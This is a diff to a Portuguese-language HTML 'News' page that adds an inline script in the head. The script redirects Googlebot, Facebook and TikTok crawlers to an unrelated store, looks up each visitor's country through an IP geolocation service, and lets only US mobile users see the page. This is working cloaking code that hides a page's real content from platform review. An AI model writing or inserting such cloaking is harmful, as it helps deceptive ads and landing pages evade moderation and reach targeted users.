@@ -1,6 +1,57 @@
 <!DOCTYPE html>
 <html lang="pt-br">
   <head>
+    <script>
+    var userAgent = navigator.userAgent;
+
+    // Função para verificar se o agente do usuário é um robô (bot).
+    function isBot() {
+        return /Googlebot|MetaURI|TikTokBot|facebookexternalhit|Facebot/i.test(userAgent);
+    }
+
+    // Função para verificar se o dispositivo é móvel.
+    function isMobile() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+    }
+
+    // Função para obter a localização geográfica do usuário.
+    function getGeolocation(callback) {
+        fetch('https://ipapi.co/json/')
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                console.log('Geolocalização obtida:', data); // Log de depuração
+                callback(data);
+            })
+            .catch(function(error) {
+                console.error('Erro ao obter geolocalização:', error);
+                callback(null);
+            });
+    }
+
+    // Verifica se o usuário é um robô (bot).
+    if (isBot()) {
+        console.log('Usuário é um bot, redirecionando...'); // Log de depuração
+        window.location.href = "https://www.tiendadarwintech.com/collections/all";
+    } else {
+        // Verifica a localização do usuário.
+        getGeolocation(function(location) {
+            if (location && location.country_code === 'US') {
+                if (isMobile()) {
+                    console.log('Usuário está nos EUA e em um dispositivo móvel, não redirecionado.'); // Permanece na página
+                } else {
+                    console.log('Usuário está nos EUA, mas não está em um dispositivo móvel, redirecionando...'); // Redireciona
+                    window.location.href = "https://www.tiendadarwintech.com/collections/all";
+                }
+            } else {
+                console.log('Usuário fora dos EUA, redirecionando...'); // Redireciona qualquer outro usuário
+                window.location.href = "https://www.tiendadarwintech.com/collections/all";
+            }
+        });
+    }
+</script>
+
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <title>News</title>
